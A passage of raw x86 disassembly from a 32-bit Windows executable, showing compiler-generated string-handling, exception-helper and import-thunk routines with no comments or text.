  406837:	int3   
  406838:	int3   
  406839:	int3   
  40683a:	mov    edi,edi
  40683c:	push   ebp
  40683d:	mov    ebp,esp
  40683f:	mov    edx,DWORD PTR [ebp+0x8]
  406842:	mov    eax,DWORD PTR [ecx+0x4]
  406845:	cmp    eax,DWORD PTR [edx+0x4]
  406848:	jne    0x406855
  40684a:	mov    eax,DWORD PTR [ecx]
  40684c:	cmp    eax,DWORD PTR [edx]
  40684e:	jne    0x406855
  406850:	xor    eax,eax
  406852:	inc    eax
  406853:	jmp    0x406857
  406855:	xor    eax,eax
  406857:	pop    ebp
  406858:	ret    0x4
  40685b:	int3   
  40685c:	int3   
  40685d:	int3   
  40685e:	int3   
  40685f:	int3   
  406860:	mov    edi,edi
  406862:	push   ebp
  406863:	mov    ebp,esp
  406865:	test   BYTE PTR [ebp+0x8],0x1
  406869:	push   esi
  40686a:	mov    esi,ecx
  40686c:	mov    DWORD PTR [esi],0x4011dc
  406872:	je     0x40687b
  406874:	push   esi
  406875:	call   0x405d96
  40687a:	pop    ecx
  40687b:	mov    eax,esi
  40687d:	pop    esi
  40687e:	pop    ebp
  40687f:	ret    0x4
  406882:	int3   
  406883:	int3   
  406884:	int3   
  406885:	int3   
  406886:	int3   
  406887:	int3   
  406888:	int3   
  406889:	int3   
  40688a:	int3   
  40688b:	int3   
  40688c:	int3   
  40688d:	int3   
  40688e:	int3   
  40688f:	int3   
  406890:	mov    edi,edi
  406892:	push   ebp
  406893:	mov    ebp,esp
  406895:	push   esi
  406896:	mov    esi,ecx
  406898:	mov    DWORD PTR [esi],0x4011cc
  40689e:	call   0x406fcc
  4068a3:	test   BYTE PTR [ebp+0x8],0x1
  4068a7:	je     0x4068b0
  4068a9:	push   esi
  4068aa:	call   0x405d96
  4068af:	pop    ecx
  4068b0:	mov    eax,esi
  4068b2:	pop    esi
  4068b3:	pop    ebp
  4068b4:	ret    0x4
  4068b7:	int3   
  4068b8:	int3   
  4068b9:	int3   
  4068ba:	int3   
  4068bb:	int3   
  4068bc:	int3   
  4068bd:	int3   
  4068be:	int3   
  4068bf:	int3   
  4068c0:	mov    edi,edi
  4068c2:	push   ebp
  4068c3:	mov    ebp,esp
  4068c5:	push   esi
  4068c6:	mov    esi,ecx
  4068c8:	call   0x406fcc
  4068cd:	test   BYTE PTR [ebp+0x8],0x1
  4068d1:	je     0x4068da
  4068d3:	push   esi
  4068d4:	call   0x405d96
  4068d9:	pop    ecx
  4068da:	mov    eax,esi
  4068dc:	pop    esi
  4068dd:	pop    ebp
  4068de:	ret    0x4
  4068e1:	int3   
  4068e2:	int3   
  4068e3:	int3   
  4068e4:	int3   
  4068e5:	int3   
  4068e6:	push   0x10
  4068e8:	mov    eax,0x407125
  4068ed:	call   0x406403
  4068f2:	mov    esi,ecx
  4068f4:	mov    DWORD PTR [ebp-0x18],esi
  4068f7:	mov    edi,DWORD PTR [ebp+0x8]
  4068fa:	or     edi,0xf
  4068fd:	cmp    edi,0xfffffffe
  406900:	jbe    0x406907
  406902:	mov    edi,DWORD PTR [ebp+0x8]
  406905:	jmp    0x406931
  406907:	xor    edx,edx
  406909:	mov    DWORD PTR [ebp-0x14],0x3
  406910:	mov    eax,edi
  406912:	mov    ebx,DWORD PTR [esi+0x14]
  406915:	div    DWORD PTR [ebp-0x14]
  406918:	mov    ecx,ebx
  40691a:	shr    ecx,1
  40691c:	cmp    ecx,eax
  40691e:	jbe    0x406931
  406920:	push   0xfffffffe
  406922:	pop    eax
  406923:	sub    eax,ecx
  406925:	cmp    ebx,eax
  406927:	ja     0x40692e
  406929:	lea    edi,[ecx+ebx*1]
  40692c:	jmp    0x406931
  40692e:	push   0xfffffffe
  406930:	pop    edi
  406931:	xor    ebx,ebx
  406933:	lea    eax,[edi+0x1]
  406936:	push   ebx
  406937:	push   eax
  406938:	mov    DWORD PTR [ebp-0x4],ebx
  40693b:	call   0x4066f9
  406940:	pop    ecx
  406941:	pop    ecx
  406942:	mov    ecx,eax
  406944:	mov    DWORD PTR [ebp-0x14],eax
  406947:	jmp    0x406978
  406949:	mov    eax,DWORD PTR [ebp+0x8]
  40694c:	mov    DWORD PTR [ebp-0x10],esp
  40694f:	mov    DWORD PTR [ebp-0x14],eax
  406952:	inc    eax
  406953:	push   0x0
  406955:	push   eax
  406956:	mov    BYTE PTR [ebp-0x4],0x2
  40695a:	call   0x4066f9
  40695f:	pop    ecx
  406960:	mov    DWORD PTR [ebp-0x1c],eax
  406963:	mov    eax,0x40696a
  406968:	pop    ecx
  406969:	ret    
  40696a:	mov    edi,DWORD PTR [ebp-0x14]
  40696d:	xor    ebx,ebx
  40696f:	mov    ecx,DWORD PTR [ebp-0x1c]
  406972:	mov    esi,DWORD PTR [ebp-0x18]
  406975:	mov    DWORD PTR [ebp-0x14],ecx
  406978:	mov    eax,DWORD PTR [ebp+0xc]
  40697b:	test   eax,eax
  40697d:	je     0x40699a
  40697f:	cmp    DWORD PTR [esi+0x14],0x10
  406983:	jb     0x406989
  406985:	mov    edx,DWORD PTR [esi]
  406987:	jmp    0x40698b
  406989:	mov    edx,esi
  40698b:	test   eax,eax
  40698d:	je     0x40699a
  40698f:	push   eax
  406990:	push   edx
  406991:	push   ecx
  406992:	call   0x406ff8
  406997:	add    esp,0xc
  40699a:	push   ebx
  40699b:	push   0x1
  40699d:	mov    ecx,esi
  40699f:	call   0x406a8a
  4069a4:	test   esi,esi
  4069a6:	je     0x4069ad
  4069a8:	mov    eax,DWORD PTR [ebp-0x14]
  4069ab:	mov    DWORD PTR [esi],eax
  4069ad:	mov    eax,DWORD PTR [ebp+0xc]
  4069b0:	mov    DWORD PTR [esi+0x14],edi
  4069b3:	mov    DWORD PTR [esi+0x10],eax
  4069b6:	cmp    edi,0x10
  4069b9:	jb     0x4069bd
  4069bb:	mov    esi,DWORD PTR [esi]
  4069bd:	mov    BYTE PTR [esi+eax*1],bl
  4069c0:	call   0x4063ea
  4069c5:	ret    0x8
  4069c8:	mov    ecx,DWORD PTR [ebp-0x18]
  4069cb:	xor    ebx,ebx
  4069cd:	push   ebx
  4069ce:	push   0x1
  4069d0:	call   0x406a8a
  4069d5:	push   ebx
  4069d6:	push   ebx
  4069d7:	call   0x406fec
  4069dc:	int3   
  4069dd:	int3   
  4069de:	int3   
  4069df:	int3   
  4069e0:	int3   
  4069e1:	int3   
  4069e2:	mov    edi,edi
  4069e4:	push   ebp
  4069e5:	mov    ebp,esp
  4069e7:	push   esi
  4069e8:	mov    esi,DWORD PTR [ebp+0x8]
  4069eb:	cmp    esi,0xfffffffe
  4069ee:	ja     0x406a3d
  4069f0:	cmp    DWORD PTR [ecx+0x14],esi
  4069f3:	jae    0x406a00
  4069f5:	push   DWORD PTR [ecx+0x10]
  4069f8:	push   esi
  4069f9:	call   0x4068e6
  4069fe:	jmp    0x406a30
  406a00:	cmp    BYTE PTR [ebp+0xc],0x0
  406a04:	je     0x406a1e
  406a06:	cmp    esi,0x10
  406a09:	jae    0x406a1e
  406a0b:	mov    eax,DWORD PTR [ecx+0x10]
  406a0e:	cmp    esi,eax
  406a10:	jae    0x406a14
  406a12:	mov    eax,esi
  406a14:	push   eax
  406a15:	push   0x1
  406a17:	call   0x406a8a
  406a1c:	jmp    0x406a30
  406a1e:	test   esi,esi
  406a20:	jne    0x406a30
  406a22:	and    DWORD PTR [ecx+0x10],esi
  406a25:	cmp    DWORD PTR [ecx+0x14],0x10
  406a29:	jb     0x406a2d
  406a2b:	mov    ecx,DWORD PTR [ecx]
  406a2d:	mov    BYTE PTR [ecx],0x0
  406a30:	xor    eax,eax
  406a32:	cmp    eax,esi
  406a34:	pop    esi
  406a35:	sbb    eax,eax
  406a37:	neg    eax
  406a39:	pop    ebp
  406a3a:	ret    0x8
  406a3d:	call   0x406af9
  406a42:	int3   
  406a43:	int3   
  406a44:	int3   
  406a45:	int3   
  406a46:	int3   
  406a47:	int3   
  406a48:	mov    edi,edi
  406a4a:	push   ebp
  406a4b:	mov    ebp,esp
  406a4d:	mov    edx,DWORD PTR [ebp+0x8]
  406a50:	test   edx,edx
  406a52:	je     0x406a7f
  406a54:	cmp    DWORD PTR [ecx+0x14],0x10
  406a58:	jb     0x406a5e
  406a5a:	mov    eax,DWORD PTR [ecx]
  406a5c:	jmp    0x406a60
  406a5e:	mov    eax,ecx
  406a60:	cmp    edx,eax
  406a62:	jb     0x406a7f
  406a64:	cmp    DWORD PTR [ecx+0x14],0x10
  406a68:	push   esi
  406a69:	jb     0x406a6f
  406a6b:	mov    esi,DWORD PTR [ecx]
  406a6d:	jmp    0x406a71
  406a6f:	mov    esi,ecx
  406a71:	mov    eax,DWORD PTR [ecx+0x10]
  406a74:	add    eax,esi
  406a76:	pop    esi
  406a77:	cmp    eax,edx
  406a79:	jbe    0x406a7f
  406a7b:	mov    al,0x1
  406a7d:	jmp    0x406a81
  406a7f:	xor    al,al
  406a81:	pop    ebp
  406a82:	ret    0x4
  406a85:	int3   
  406a86:	int3   
  406a87:	int3   
  406a88:	int3   
  406a89:	int3   
  406a8a:	mov    edi,edi
  406a8c:	push   ebp
  406a8d:	mov    ebp,esp
  406a8f:	cmp    BYTE PTR [ebp+0x8],0x0
  406a93:	push   esi
  406a94:	push   edi
  406a95:	mov    edi,DWORD PTR [ebp+0xc]
  406a98:	mov    esi,ecx
  406a9a:	je     0x406abc
  406a9c:	cmp    DWORD PTR [esi+0x14],0x10
  406aa0:	jb     0x406abc
  406aa2:	push   ebx
  406aa3:	mov    ebx,DWORD PTR [esi]
  406aa5:	test   edi,edi
  406aa7:	je     0x406ab4
  406aa9:	push   edi
  406aaa:	push   ebx
  406aab:	push   esi
  406aac:	call   0x406ff8
  406ab1:	add    esp,0xc
  406ab4:	push   ebx
  406ab5:	call   0x405d96
  406aba:	pop    ecx
  406abb:	pop    ebx
  406abc:	mov    DWORD PTR [esi+0x10],edi
  406abf:	mov    DWORD PTR [esi+0x14],0xf
  406ac6:	mov    BYTE PTR [edi+esi*1],0x0
  406aca:	pop    edi
  406acb:	pop    esi
  406acc:	pop    ebp
  406acd:	ret    0x8
  406ad0:	int3   
  406ad1:	int3   
  406ad2:	int3   
  406ad3:	int3   
  406ad4:	int3   
  406ad5:	mov    edi,edi
  406ad7:	push   ebp
  406ad8:	mov    ebp,esp
  406ada:	sub    esp,0xc
  406add:	lea    ecx,[ebp-0xc]
  406ae0:	call   0x406788
  406ae5:	push   0x4072e8
  406aea:	lea    eax,[ebp-0xc]
  406aed:	push   eax
  406aee:	call   0x406fec
  406af3:	int3   
  406af4:	int3   
  406af5:	int3   
  406af6:	int3   
  406af7:	int3   
  406af8:	int3   
  406af9:	push   0x401298
  406afe:	call   0x406b09
  406b03:	int3   
  406b04:	int3   
  406b05:	int3   
  406b06:	int3   
  406b07:	int3   
  406b08:	int3   
  406b09:	mov    edi,edi
  406b0b:	push   ebp
  406b0c:	mov    ebp,esp
  406b0e:	sub    esp,0xc
  406b11:	lea    ecx,[ebp-0xc]
  406b14:	push   DWORD PTR [ebp+0x8]
  406b17:	call   0x4067e8
  406b1c:	push   0x407358
  406b21:	lea    eax,[ebp-0xc]
  406b24:	push   eax
  406b25:	call   0x406fec
  406b2a:	int3   
  406b2b:	int3   
  406b2c:	int3   
  406b2d:	int3   
  406b2e:	int3   
  406b2f:	int3   
  406b30:	mov    edi,edi
  406b32:	push   ebp
  406b33:	mov    ebp,esp
  406b35:	sub    esp,0xc
  406b38:	lea    ecx,[ebp-0xc]
  406b3b:	push   DWORD PTR [ebp+0x8]
  406b3e:	call   0x4067e8
  406b43:	push   0x407394
  406b48:	lea    eax,[ebp-0xc]
  406b4b:	push   eax
  406b4c:	call   0x406fec
  406b51:	int3   
  406b52:	int3   
  406b53:	int3   
  406b54:	int3   
  406b55:	int3   
  406b56:	int3   
  406b57:	push   0x401280
  406b5c:	call   0x406b30
  406b61:	int3   
  406b62:	int3   
  406b63:	int3   
  406b64:	int3   
  406b65:	int3   
  406b66:	int3   
  406b67:	mov    edi,edi
  406b69:	push   ebp
  406b6a:	mov    ebp,esp
  406b6c:	mov    eax,DWORD PTR [ebp+0xc]
  406b6f:	push   ebx
  406b70:	mov    ebx,DWORD PTR [ebp+0x8]
  406b73:	push   esi
  406b74:	push   edi
  406b75:	mov    esi,ecx
  406b77:	mov    edi,DWORD PTR [ebx+0x10]
  406b7a:	cmp    edi,eax
  406b7c:	jb     0x406bf3
  406b7e:	sub    edi,eax
  406b80:	cmp    DWORD PTR [ebp+0x10],edi
  406b83:	jae    0x406b88
  406b85:	mov    edi,DWORD PTR [ebp+0x10]
  406b88:	cmp    esi,ebx
  406b8a:	jne    0x406ba3
  406b8c:	add    eax,edi
  406b8e:	push   eax
  406b8f:	call   0x406d5f
  406b94:	mov    eax,DWORD PTR [ebp+0xc]
  406b97:	mov    ecx,esi
  406b99:	push   eax
  406b9a:	push   0x0
  406b9c:	call   0x406d90
  406ba1:	jmp    0x406bea
  406ba3:	push   0x0
  406ba5:	push   edi
  406ba6:	call   0x4069e2
  406bab:	test   al,al
  406bad:	je     0x406bea
  406baf:	cmp    DWORD PTR [ebx+0x14],0x10
  406bb3:	jb     0x406bb7
  406bb5:	mov    ebx,DWORD PTR [ebx]
  406bb7:	cmp    DWORD PTR [esi+0x14],0x10
  406bbb:	jb     0x406bc1
  406bbd:	mov    ecx,DWORD PTR [esi]
  406bbf:	jmp    0x406bc3
  406bc1:	mov    ecx,esi
  406bc3:	test   edi,edi
  406bc5:	je     0x406bd7
  406bc7:	mov    eax,DWORD PTR [ebp+0xc]
  406bca:	push   edi
  406bcb:	add    eax,ebx
  406bcd:	push   eax
  406bce:	push   ecx
  406bcf:	call   0x406ff8
  406bd4:	add    esp,0xc
  406bd7:	cmp    DWORD PTR [esi+0x14],0x10
  406bdb:	mov    DWORD PTR [esi+0x10],edi
  406bde:	jb     0x406be4
  406be0:	mov    eax,DWORD PTR [esi]
  406be2:	jmp    0x406be6
  406be4:	mov    eax,esi
  406be6:	mov    BYTE PTR [eax+edi*1],0x0
  406bea:	pop    edi
  406beb:	mov    eax,esi
  406bed:	pop    esi
  406bee:	pop    ebx
  406bef:	pop    ebp
  406bf0:	ret    0xc
  406bf3:	call   0x406b57
  406bf8:	int3   
  406bf9:	int3   
  406bfa:	int3   
  406bfb:	int3   
  406bfc:	int3   
  406bfd:	int3   
  406bfe:	mov    edi,edi
  406c00:	push   ebp
  406c01:	mov    ebp,esp
  406c03:	push   ebx
  406c04:	mov    ebx,DWORD PTR [ebp+0x8]
  406c07:	push   esi
  406c08:	push   ebx
  406c09:	mov    esi,ecx
  406c0b:	call   0x406a48
  406c10:	test   al,al
  406c12:	je     0x406c30
  406c14:	cmp    DWORD PTR [esi+0x14],0x10
  406c18:	jb     0x406c1e
  406c1a:	mov    eax,DWORD PTR [esi]
  406c1c:	jmp    0x406c20
  406c1e:	mov    eax,esi
  406c20:	push   DWORD PTR [ebp+0xc]
  406c23:	sub    ebx,eax
  406c25:	mov    ecx,esi
  406c27:	push   ebx
  406c28:	push   esi
  406c29:	call   0x406b67
  406c2e:	jmp    0x406c73
  406c30:	push   edi
  406c31:	mov    edi,DWORD PTR [ebp+0xc]
  406c34:	mov    ecx,esi
  406c36:	push   0x0
  406c38:	push   edi
  406c39:	call   0x4069e2
  406c3e:	test   al,al
  406c40:	je     0x406c70
  406c42:	cmp    DWORD PTR [esi+0x14],0x10
  406c46:	jb     0x406c4c
  406c48:	mov    eax,DWORD PTR [esi]
  406c4a:	jmp    0x406c4e
  406c4c:	mov    eax,esi
  406c4e:	test   edi,edi
  406c50:	je     0x406c5d
  406c52:	push   edi
  406c53:	push   ebx
  406c54:	push   eax
  406c55:	call   0x406ff8
  406c5a:	add    esp,0xc
  406c5d:	cmp    DWORD PTR [esi+0x14],0x10
  406c61:	mov    DWORD PTR [esi+0x10],edi
  406c64:	jb     0x406c6a
  406c66:	mov    eax,DWORD PTR [esi]
  406c68:	jmp    0x406c6c
  406c6a:	mov    eax,esi
  406c6c:	mov    BYTE PTR [eax+edi*1],0x0
  406c70:	mov    eax,esi
  406c72:	pop    edi
  406c73:	pop    esi
  406c74:	pop    ebx
  406c75:	pop    ebp
  406c76:	ret    0x8
  406c79:	int3   
  406c7a:	int3   
  406c7b:	int3   
  406c7c:	int3   
  406c7d:	int3   
  406c7e:	int3   
  406c7f:	int3   
  406c80:	mov    edi,edi
  406c82:	push   ebp
  406c83:	mov    ebp,esp
  406c85:	push   esi
  406c86:	mov    esi,DWORD PTR [ebp+0xc]
  406c89:	push   esi
  406c8a:	call   0x406f2b
  406c8f:	test   eax,eax
  406c91:	mov    eax,DWORD PTR [ebp+0x8]
  406c94:	pop    ecx
  406c95:	mov    DWORD PTR [eax],esi
  406c97:	je     0x406ca2
  406c99:	mov    DWORD PTR [eax+0x4],0x40900c
  406ca0:	jmp    0x406ca9
  406ca2:	mov    DWORD PTR [eax+0x4],0x409014
  406ca9:	pop    esi
  406caa:	pop    ebp
  406cab:	ret    0x8
  406cae:	int3   
  406caf:	int3   
  406cb0:	int3   
  406cb1:	int3   
  406cb2:	int3   
  406cb3:	int3   
  406cb4:	int3   
  406cb5:	int3   
  406cb6:	int3   
  406cb7:	int3   
  406cb8:	int3   
  406cb9:	int3   
  406cba:	int3   
  406cbb:	int3   
  406cbc:	int3   
  406cbd:	int3   
  406cbe:	int3   
  406cbf:	int3   
  406cc0:	mov    edi,edi
  406cc2:	push   ebp
  406cc3:	mov    ebp,esp
  406cc5:	mov    eax,DWORD PTR [ebp+0x8]
  406cc8:	mov    edx,DWORD PTR [ebp+0xc]
  406ccb:	mov    DWORD PTR [eax],edx
  406ccd:	mov    DWORD PTR [eax+0x4],ecx
  406cd0:	pop    ebp
  406cd1:	ret    0x8
  406cd4:	int3   
  406cd5:	int3   
  406cd6:	int3   
  406cd7:	int3   
  406cd8:	int3   
  406cd9:	int3   
  406cda:	int3   
  406cdb:	int3   
  406cdc:	int3   
  406cdd:	int3   
  406cde:	int3   
  406cdf:	int3   
  406ce0:	mov    edi,edi
  406ce2:	push   ebp
  406ce3:	mov    ebp,esp
  406ce5:	mov    eax,DWORD PTR [ebp+0x8]
  406ce8:	cmp    ecx,DWORD PTR [eax+0x4]
  406ceb:	jne    0x406cf9
  406ced:	mov    eax,DWORD PTR [eax]
  406cef:	cmp    eax,DWORD PTR [ebp+0xc]
  406cf2:	jne    0x406cf9
  406cf4:	xor    eax,eax
  406cf6:	inc    eax
  406cf7:	jmp    0x406cfb
  406cf9:	xor    eax,eax
  406cfb:	pop    ebp
  406cfc:	ret    0x8
  406cff:	int3   
  406d00:	int3   
  406d01:	int3   
  406d02:	int3   
  406d03:	int3   
  406d04:	int3   
  406d05:	int3   
  406d06:	int3   
  406d07:	int3   
  406d08:	int3   
  406d09:	int3   
  406d0a:	int3   
  406d0b:	int3   
  406d0c:	int3   
  406d0d:	int3   
  406d0e:	int3   
  406d0f:	int3   
  406d10:	mov    edi,edi
  406d12:	push   ebp
  406d13:	mov    ebp,esp
  406d15:	sub    esp,0xc
  406d18:	mov    eax,ds:0x409004
  406d1d:	xor    eax,ebp
  406d1f:	mov    DWORD PTR [ebp-0x4],eax
  406d22:	push   esi
  406d23:	push   edi
  406d24:	push   DWORD PTR [ebp+0xc]
  406d27:	mov    edi,ecx
  406d29:	lea    ecx,[ebp-0xc]
  406d2c:	push   DWORD PTR [ebp+0x8]
  406d2f:	push   ecx
  406d30:	mov    eax,DWORD PTR [edi]
  406d32:	mov    esi,DWORD PTR [eax+0xc]
  406d35:	mov    ecx,esi
  406d37:	call   DWORD PTR ds:0x40a1ec
  406d3d:	mov    ecx,edi
  406d3f:	call   esi
  406d41:	mov    ecx,eax
  406d43:	call   0x40683a
  406d48:	mov    ecx,DWORD PTR [ebp-0x4]
  406d4b:	pop    edi
  406d4c:	xor    ecx,ebp
  406d4e:	pop    esi
  406d4f:	call   0x405d80
  406d54:	mov    esp,ebp
  406d56:	pop    ebp
  406d57:	ret    0x8
  406d5a:	int3   
  406d5b:	int3   
  406d5c:	int3   
  406d5d:	int3   
  406d5e:	int3   
  406d5f:	mov    edi,edi
  406d61:	push   ebp
  406d62:	mov    ebp,esp
  406d64:	mov    eax,DWORD PTR [ebp+0x8]
  406d67:	cmp    DWORD PTR [ecx+0x10],eax
  406d6a:	jb     0x406d85
  406d6c:	cmp    DWORD PTR [ecx+0x14],0x10
  406d70:	mov    DWORD PTR [ecx+0x10],eax
  406d73:	jb     0x406d79
  406d75:	mov    edx,DWORD PTR [ecx]
  406d77:	jmp    0x406d7b
  406d79:	mov    edx,ecx
  406d7b:	mov    BYTE PTR [edx+eax*1],0x0
  406d7f:	mov    eax,ecx
  406d81:	pop    ebp
  406d82:	ret    0x4
  406d85:	call   0x406b57
  406d8a:	int3   
  406d8b:	int3   
  406d8c:	int3   
  406d8d:	int3   
  406d8e:	int3   
  406d8f:	int3   
  406d90:	mov    edi,edi
  406d92:	push   ebp
  406d93:	mov    ebp,esp
  406d95:	push   esi
  406d96:	mov    esi,ecx
  406d98:	mov    ecx,DWORD PTR [ebp+0x8]
  406d9b:	push   edi
  406d9c:	mov    edi,DWORD PTR [esi+0x10]
  406d9f:	cmp    edi,ecx
  406da1:	jb     0x406e0a
  406da3:	mov    edx,DWORD PTR [ebp+0xc]
  406da6:	mov    eax,edi
  406da8:	sub    eax,ecx
  406daa:	cmp    eax,edx
  406dac:	ja     0x406dc3
  406dae:	cmp    DWORD PTR [esi+0x14],0x10
  406db2:	mov    DWORD PTR [esi+0x10],ecx
  406db5:	jb     0x406dbb
  406db7:	mov    eax,DWORD PTR [esi]
  406db9:	jmp    0x406dbd
  406dbb:	mov    eax,esi
  406dbd:	mov    BYTE PTR [eax+ecx*1],0x0
  406dc1:	jmp    0x406e02
  406dc3:	test   edx,edx
  406dc5:	je     0x406e02
  406dc7:	cmp    DWORD PTR [esi+0x14],0x10
  406dcb:	jb     0x406dd1
  406dcd:	mov    eax,DWORD PTR [esi]
  406dcf:	jmp    0x406dd3
  406dd1:	mov    eax,esi
  406dd3:	sub    edi,edx
  406dd5:	push   ebx
  406dd6:	lea    ebx,[eax+ecx*1]
  406dd9:	mov    eax,edi
  406ddb:	sub    eax,ecx
  406ddd:	je     0x406dee
  406ddf:	push   eax
  406de0:	lea    eax,[ebx+edx*1]
  406de3:	push   eax
  406de4:	push   ebx
  406de5:	call   DWORD PTR ds:0x40a1c0
  406deb:	add    esp,0xc
  406dee:	cmp    DWORD PTR [esi+0x14],0x10
  406df2:	mov    DWORD PTR [esi+0x10],edi
  406df5:	pop    ebx
  406df6:	jb     0x406dfc
  406df8:	mov    eax,DWORD PTR [esi]
  406dfa:	jmp    0x406dfe
  406dfc:	mov    eax,esi
  406dfe:	mov    BYTE PTR [eax+edi*1],0x0
  406e02:	pop    edi
  406e03:	mov    eax,esi
  406e05:	pop    esi
  406e06:	pop    ebp
  406e07:	ret    0x8
  406e0a:	mov    ecx,esi
  406e0c:	call   0x406b57
  406e11:	int3   
  406e12:	int3   
  406e13:	int3   
  406e14:	int3   
  406e15:	int3   
  406e16:	int3   
  406e17:	mov    edi,edi
  406e19:	push   ebp
  406e1a:	mov    ebp,esp
  406e1c:	mov    eax,DWORD PTR [ebp+0x8]
  406e1f:	cmp    BYTE PTR [eax],0x0
  406e22:	jne    0x406e28
  406e24:	xor    eax,eax
  406e26:	pop    ebp
  406e27:	ret    
  406e28:	lea    edx,[eax+0x1]
  406e2b:	mov    cl,BYTE PTR [eax]
  406e2d:	inc    eax
  406e2e:	test   cl,cl
  406e30:	jne    0x406e2b
  406e32:	sub    eax,edx
  406e34:	pop    ebp
  406e35:	ret    
  406e36:	int3   
  406e37:	int3   
  406e38:	int3   
  406e39:	int3   
  406e3a:	int3   
  406e3b:	int3   
  406e3c:	int3   
  406e3d:	int3   
  406e3e:	int3   
  406e3f:	int3   
  406e40:	mov    edi,edi
  406e42:	push   ebp
  406e43:	mov    ebp,esp
  406e45:	push   ecx
  406e46:	push   DWORD PTR [ebp+0xc]
  406e49:	and    DWORD PTR [ebp-0x4],0x0
  406e4d:	call   0x406f2b
  406e52:	pop    ecx
  406e53:	test   eax,eax
  406e55:	jne    0x406e5c
  406e57:	mov    eax,0x401214
  406e5c:	mov    ecx,DWORD PTR [ebp+0x8]
  406e5f:	push   eax
  406e60:	call   0x406727
  406e65:	mov    eax,DWORD PTR [ebp+0x8]
  406e68:	mov    esp,ebp
  406e6a:	pop    ebp
  406e6b:	ret    0x8
  406e6e:	int3   
  406e6f:	int3   
  406e70:	int3   
  406e71:	int3   
  406e72:	int3   
  406e73:	int3   
  406e74:	int3   
  406e75:	int3   
  406e76:	int3   
  406e77:	int3   
  406e78:	int3   
  406e79:	int3   
  406e7a:	int3   
  406e7b:	int3   
  406e7c:	int3   
  406e7d:	int3   
  406e7e:	int3   
  406e7f:	int3   
  406e80:	mov    edi,edi
  406e82:	push   ebp
  406e83:	mov    ebp,esp
  406e85:	push   ecx
  406e86:	and    DWORD PTR [ebp-0x4],0x0
  406e8a:	cmp    DWORD PTR [ebp+0xc],0x1
  406e8e:	jne    0x406e9f
  406e90:	mov    ecx,DWORD PTR [ebp+0x8]
  406e93:	push   0x401248
  406e98:	call   0x406727
  406e9d:	jmp    0x406eaa
  406e9f:	push   DWORD PTR [ebp+0xc]
  406ea2:	push   DWORD PTR [ebp+0x8]
  406ea5:	call   0x406e40
  406eaa:	mov    eax,DWORD PTR [ebp+0x8]
  406ead:	mov    esp,ebp
  406eaf:	pop    ebp
  406eb0:	ret    0x8
  406eb3:	int3   
  406eb4:	int3   
  406eb5:	int3   
  406eb6:	int3   
  406eb7:	int3   
  406eb8:	int3   
  406eb9:	int3   
  406eba:	int3   
  406ebb:	int3   
  406ebc:	int3   
  406ebd:	int3   
  406ebe:	int3   
  406ebf:	int3   
  406ec0:	mov    edi,edi
  406ec2:	push   ebp
  406ec3:	mov    ebp,esp
  406ec5:	push   ecx
  406ec6:	push   DWORD PTR [ebp+0xc]
  406ec9:	and    DWORD PTR [ebp-0x4],0x0
  406ecd:	call   0x406f5c
  406ed2:	pop    ecx
  406ed3:	test   eax,eax
  406ed5:	jne    0x406edc
  406ed7:	mov    eax,0x401214
  406edc:	mov    ecx,DWORD PTR [ebp+0x8]
  406edf:	push   eax
  406ee0:	call   0x406727
  406ee5:	mov    eax,DWORD PTR [ebp+0x8]
  406ee8:	mov    esp,ebp
  406eea:	pop    ebp
  406eeb:	ret    0x8
  406eee:	int3   
  406eef:	int3   
  406ef0:	int3   
  406ef1:	int3   
  406ef2:	int3   
  406ef3:	int3   
  406ef4:	int3   
  406ef5:	int3   
  406ef6:	int3   
  406ef7:	int3   
  406ef8:	int3   
  406ef9:	int3   
  406efa:	int3   
  406efb:	int3   
  406efc:	int3   
  406efd:	int3   
  406efe:	int3   
  406eff:	int3   
  406f00:	mov    eax,0x40120c
  406f05:	ret    
  406f06:	int3   
  406f07:	int3   
  406f08:	int3   
  406f09:	int3   
  406f0a:	int3   
  406f0b:	int3   
  406f0c:	int3   
  406f0d:	int3   
  406f0e:	int3   
  406f0f:	int3   
  406f10:	mov    eax,0x40123c
  406f15:	ret    
  406f16:	int3   
  406f17:	int3   
  406f18:	int3   
  406f19:	int3   
  406f1a:	int3   
  406f1b:	int3   
  406f1c:	int3   
  406f1d:	int3   
  406f1e:	int3   
  406f1f:	int3   
  406f20:	mov    eax,0x401278
  406f25:	ret    
  406f26:	int3   
  406f27:	int3   
  406f28:	int3   
  406f29:	int3   
  406f2a:	int3   
  406f2b:	mov    edi,edi
  406f2d:	push   ebp
  406f2e:	mov    ebp,esp
  406f30:	cmp    DWORD PTR ds:0x4018d4,0x0
  406f37:	mov    eax,0x4018d0
  406f3c:	je     0x406f4e
  406f3e:	mov    ecx,DWORD PTR [ebp+0x8]
  406f41:	cmp    DWORD PTR [eax],ecx
  406f43:	je     0x406f52
  406f45:	add    eax,0x8
  406f48:	cmp    DWORD PTR [eax+0x4],0x0
  406f4c:	jne    0x406f41
  406f4e:	xor    eax,eax
  406f50:	pop    ebp
  406f51:	ret    
  406f52:	mov    eax,DWORD PTR [eax+0x4]
  406f55:	pop    ebp
  406f56:	ret    
  406f57:	int3   
  406f58:	int3   
  406f59:	int3   
  406f5a:	int3   
  406f5b:	int3   
  406f5c:	mov    edi,edi
  406f5e:	push   ebp
  406f5f:	mov    ebp,esp
  406f61:	cmp    DWORD PTR ds:0x4012ac,0x0
  406f68:	mov    eax,0x4012a8
  406f6d:	je     0x406f7f
  406f6f:	mov    ecx,DWORD PTR [ebp+0x8]
  406f72:	cmp    DWORD PTR [eax],ecx
  406f74:	je     0x406f83
  406f76:	add    eax,0x8
  406f79:	cmp    DWORD PTR [eax+0x4],0x0
  406f7d:	jne    0x406f72
  406f7f:	xor    eax,eax
  406f81:	pop    ebp
  406f82:	ret    
  406f83:	mov    eax,DWORD PTR [eax+0x4]
  406f86:	pop    ebp
  406f87:	ret    
  406f88:	int3   
  406f89:	int3   
  406f8a:	int3   
  406f8b:	int3   
  406f8c:	int3   
  406f8d:	int3   
  406f8e:	jmp    DWORD PTR ds:0x40a1bc
  406f94:	int3   
  406f95:	int3   
  406f96:	int3   
  406f97:	int3   
  406f98:	int3   
  406f99:	int3   
  406f9a:	jmp    DWORD PTR ds:0x40a1c4
  406fa0:	int3   
  406fa1:	int3   
  406fa2:	int3   
  406fa3:	int3   
  406fa4:	int3   
  406fa5:	int3   
  406fa6:	jmp    DWORD PTR ds:0x40a1c8
  406fac:	int3   
  406fad:	int3   
  406fae:	int3   
  406faf:	int3   
  406fb0:	int3   
  406fb1:	int3   
  406fb2:	int3   
  406fb3:	int3   
  406fb4:	int3   
  406fb5:	int3   
  406fb6:	int3   
  406fb7:	int3   
